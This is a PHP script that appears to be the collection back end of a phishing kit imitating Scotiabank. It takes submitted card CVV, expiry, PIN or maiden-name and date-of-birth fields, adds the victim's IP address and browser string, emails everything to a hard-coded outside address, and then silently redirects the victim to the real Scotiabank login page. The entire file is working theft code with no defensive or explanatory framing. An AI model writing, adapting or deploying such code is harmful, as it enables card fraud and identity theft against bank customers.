<?php
$cvv = $_POST['sin'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$exp = $_POST['dl'];
$mmn = $_POST['mmn'];
$dob = $_POST['dob'];
$data ="
===============POSEIDON==================
CVV : $cvv
EXP : $exp
PIN : $mmn
DOB : $dob
========================================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##SCO #$ip";

$emailusr = 'ventura514@outlook.com';

$emailusr2 = 'ventura514@outlook.com';

mail($emailusr, $subj, $data);	

mail($emailusr2, $subj, $data);	

header("Location: https://www.scotiaonline.scotiabank.com/online/authentication/authentication.bns");

?>